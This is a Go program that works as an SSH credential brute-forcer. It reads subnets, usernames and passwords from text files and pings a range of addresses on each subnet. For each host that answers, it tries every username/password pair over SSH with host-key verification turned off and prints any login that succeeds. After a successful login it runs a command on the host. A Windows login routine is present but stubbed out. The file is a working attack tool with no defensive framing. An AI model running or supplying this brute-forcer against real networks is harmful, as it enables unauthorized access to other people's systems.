package main

import ("github.com/tatsushid/go-fastping"
		"golang.org/x/crypto/ssh"
		"fmt"
		"time"
		"strings"
		"os"
		"log"
		"bufio"
		"strconv"
		"net"
		"runtime")

func main() {
	myos := runtime.GOOS
	var user []string = readinfile("user.txt")
	var passwds []string = readinfile("passwds.txt")
	var subnets []string = readinfile("subnets.txt")
	var step []string = readinfile("step.txt")
	start, err := strconv.ParseInt(step[0], 10, 64)
	if err != nil{
		log.Fatal(err)
	}
	stop, err := strconv.ParseInt(step[1], 10, 0)
	if err != nil{
		log.Fatal(err)
	}
	stepval, err := strconv.ParseInt(step[2], 10, 0)
	if err != nil{
		log.Fatal(err)
	}
	var myip string = ""
	var passbreak bool = false
	for i := 0; i < len(subnets); i++ {
		for l := start; l <= stop; l=l+stepval{
			myip = joinstrings(subnets[i],strconv.Itoa(int(l)))
			var iswin bool = false
			if checkip(myip){
				fmt.Println("Ping Works For IP %s", myip)
			n := 0
			for j := 0; j < len(user); j++ {
				for k := 0; k < len(passwds); k++ {
					if !(iswin) {
						n = len(getinlinux(myip, user[j], passwds[k]))
					} 
					if n == 3 {
						fmt.Println("ssh works for %s with user:%s and pass:%s", myip,user[j],passwds[k] )
						passbreak = true
						break
					} 
					if n == 1{
						iswin = true
					} 
					if iswin{
						if  myos == "windows"{
							wincon := getinwin(myip, user[j],passwds[k])
							if wincon {
								fmt.Println("Im in windows with", myip, user[j], passwds[k])
								passbreak = true
								break
							} else{
								fmt.Println("didnt work windows with", myip ,user[j], passwds[k])
							}
						} else{
							fmt.Println("cant get onto windows from nonwindows :(")
							passbreak = true
							break
						}
					} 
					if n == 2{
						fmt.Println("ssh doesn't work for %s with user:%s and pass:%s", myip,user[j],passwds[k] )
					} 
				}
				if passbreak {
					passbreak = false
					break
				}
			}
			} else{
				fmt.Println("Ping Doesn't Work For IP %s", myip)
			}
		}
		}	
	 } 

func checkip(myip string) (ipworks bool){
	ipworks = false
	p := fastping.NewPinger()
	ra, err := net.ResolveIPAddr("ip4:icmp", myip)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	p.AddIPAddr(ra)
	p.OnRecv = func(addr *net.IPAddr, rtt time.Duration) {
		ipworks = true
		return
	}
	p.OnIdle = func() {
		return
	}
	err = p.Run()
	if err != nil {
		fmt.Println(err)
	}
	return
}

func getinlinux(myip string, user string, passwd string) (myreturn string){
	sshConfig := &ssh.ClientConfig{
	User: user,
	HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	Timeout:         2 * time.Second,
	Auth: []ssh.AuthMethod{
		ssh.Password(passwd)},
	}
	var dest string = joinstrings(myip,":22")
	fmt.Println(dest)
	connection, err := ssh.Dial("tcp", dest, sshConfig)
	if err != nil {
		fmt.Println(err)
		if strings.Contains(err.Error(), "unable to authenticate") {
			return "no"
		} else{
			return "w"
		}
	}
	session, err := connection.NewSession()
	if err != nil {
		fmt.Println("NewSession no bueno")
		return "no"
	}
	modes := ssh.TerminalModes{
	ssh.ECHO:          0,     // disable echoing
	ssh.TTY_OP_ISPEED: 14400, // input speed = 14.4kbaud
	ssh.TTY_OP_OSPEED: 14400, // output speed = 14.4kbaud
}

	if err := session.RequestPty("xterm", 80, 40, modes); err != nil {
		session.Close()
		fmt.Println("cant open terminal")
		return "no"
	}

	err = session.Run("ls -l $LC_USR_DIR")
	return "yes"
}

func getinwin(myip string, user string, passwd string) (wincon bool) {
	wincon = false
	return
}

func joinstrings(string1, string2 string) (mashstring string){
	var strs []string
	strs = append(strs, string1)
	strs = append(strs, string2)
	mashstring = strings.Join(strs, "")
	return
}

func readinfile(myfile string) (readinarr []string){
	file, err := os.Open(myfile)
    if err != nil {
        log.Fatal(err)
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        readinarr = append(readinarr, scanner.Text())
    }

    if err := scanner.Err(); err != nil {
        log.Fatal(err)
    }
    return
}